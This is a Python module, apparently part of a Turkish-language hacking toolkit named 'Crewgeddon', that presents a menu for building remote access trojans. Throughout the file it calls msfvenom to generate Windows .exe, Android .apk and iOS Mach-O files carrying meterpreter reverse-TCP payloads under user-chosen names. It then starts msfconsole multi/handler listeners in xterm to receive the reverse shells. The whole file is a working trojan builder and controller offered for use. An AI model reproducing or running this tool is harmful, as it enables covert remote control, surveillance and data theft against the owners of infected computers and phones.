from colorama import Fore
import subprocess
import os
import time

def trojenSistem():
    print(Fore.GREEN + "[0]" + Fore.BLUE + " - Ana Menü")
    print(Fore.GREEN + "[1]" + Fore.BLUE + " - Masaüstü RAT Oluşturucu")
    print(Fore.GREEN + "[2]" + Fore.BLUE + " - Android Telefon RAT Oluşturucu")
    print(Fore.GREEN + "[3]" + Fore.BLUE + " - IOS Telefon RAT Oluşturucu")
    print(Fore.GREEN + "[4]" + Fore.BLUE + " - Dinlemeyi Başlatın")
    rat_select = int(input(Fore.CYAN + "CREWGEDDON~#: "))

    if rat_select == 0:
        return rat_select
    elif rat_select == 1:
        ip_adress = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
        port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
        exe_name = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Uygulama Adı: ")
        os.system(f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f exe > {exe_name}.exe")
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Başarıyla trojen oluşturuldu, {Fore.GREEN}/crewgeddon/{exe_name}.exe")
    elif rat_select == 2:
        ip_adress = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
        port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
        apk_name = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Uygulama Adı: ")
        os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip_adress} LPORT={port} -f apk > {apk_name}.apk")
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Başarıyla trojen oluşturuldu, {Fore.GREEN}/crewgeddon/{apk_name}.apk")
    elif rat_select == 3:
        ip_adress = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
        port = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
        app_name = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}Uygulama Adı: ")
        os.system(f"msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST={ip_adress} LPORT={port} -f macho > {app_name}.macho")
        print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Başarıyla trojen oluşturuldu, {Fore.GREEN}/crewgeddon/{app_name}.macho")
    elif rat_select == 4:
        print(Fore.CYAN + "[0]" + Fore.BLUE + " Ana Menü")
        print(Fore.CYAN + "[1]" + Fore.BLUE + " Android Dinleyici")
        print(Fore.CYAN + "[2]" + Fore.BLUE + " IOS Dinleyici")
        print(Fore.CYAN + "[3]" + Fore.BLUE + " Desktop Dinleyici")
        secim_dinleyici = int(input(Fore.CYAN + "CREWGEDDON~#: "))

        if secim_dinleyici == 0:
            return secim_dinleyici
        elif secim_dinleyici == 1:
            lhost = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
            lport = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Dinleyici başlatılıyor, lütfen bekleyin.")
            time.sleep(2)
            subprocess.Popen(
                [
                    "xterm",
                    "-T",
                    "Crewgeddon - Dinleyici (Android)",
                    "-hold",
                    "-e",
                    f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD android/meterpreter/reverse_tcp; exploit'",
                ]
            )
        elif secim_dinleyici == 2:
            lhost = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
            lport = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Dinleyici başlatılıyor, lütfen bekleyin.")
            time.sleep(2)
            subprocess.Popen(
                [
                    "xterm",
                    "-T",
                    "Crewgeddon - Dinleyici (IOS)",
                    "-hold",
                    "-e",
                    f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD apple_ios/aarch64/meterpreter_reverse_tcp; exploit'",
                ]
            )

        elif secim_dinleyici == 3:
            lhost = input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LHOST: ")
            lport = int(input(f"{Fore.BLUE}[CREWGEDDON]: {Fore.WHITE}LPORT: "))
            print(f"{Fore.GREEN}[CREWGEDDON]: {Fore.WHITE}Dinleyici başlatılıyor, lütfen bekleyin.")
            time.sleep(2)
            subprocess.Popen(
                [
                    "xterm",
                    "-T",
                    "Crewgeddon - Dinleyici (Desktop)",
                    "-hold",
                    "-e",
                    f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'",
                ]
            )
    else:
        print(f"{Fore.RED}[CREWGEDDON]: {Fore.WHITE}Geçersiz seçim yaptınız.")
